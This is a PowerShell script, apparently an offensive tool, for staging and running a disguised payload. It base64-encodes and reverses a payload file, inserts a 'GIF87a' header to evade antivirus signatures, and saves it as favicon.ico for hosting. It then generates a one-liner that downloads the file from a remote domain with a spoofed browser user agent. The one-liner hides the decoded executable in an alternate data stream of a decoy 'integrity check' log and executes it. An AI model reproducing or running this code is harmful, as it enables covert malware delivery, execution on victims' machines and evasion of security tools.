
param(
    [string]$filename,  #filename of the payload
    [string]$domain    #example https://domain.com
)
Write-Host obfuscating $filename

#base64 the payload and reverse the base64 string 
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename));
$reversed = $b64[-1..-$b64.Length ] -join "";

#grab the first 10 characters from the string and replace it with a well known file signature to try to fool simple AV signatures
$replace_value = $reversed[1..10] -join ''
$obfuscated = $reversed.replace($replace_value,'GIF87a',1)


Out-File -FilePath favicon.ico -InputObject $obfuscated
Write-Host "favicon.ico is ready for hosting!"

#one liner create section
$url = $domain + '/images/favicon.ico'
$uncompressed_oneliner = @"
`$json = (Invoke-WebRequest -uri $url -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36').content;
`$json =[System.Text.Encoding]::UTF8.GetString(`$json);
`$telemetry = `$json.replace('GIF87a',`'$replace_value`');
`$reversed = `$telemetry[-1..-`$telemetry.Length ] -join '';
`$integrity = `$env:LOCALAPPDATA+'\App_Integrity.log';
echo 'daily program file integrity check, !!DO NOT DELETE!!`n`n'> `$integrity;
dir `$env:LOCALAPPDATA >> `$integrity;
`$decoded = [System.Convert]::FromBase64CharArray(`$reversed, 0, `$reversed.Length);
Set-Content `$integrity -stream updater.exe -Value `$decoded -Encoding Byte;
set-location -path `$env:LOCALAPPDATA;
.\App_Integrity.log:updater.exe
"@


$oneliner = $uncompressed_oneliner -replace ('\r?\n','')
Write-Host $oneliner
Out-File -FilePath oneliner.txt -InputObject $oneliner


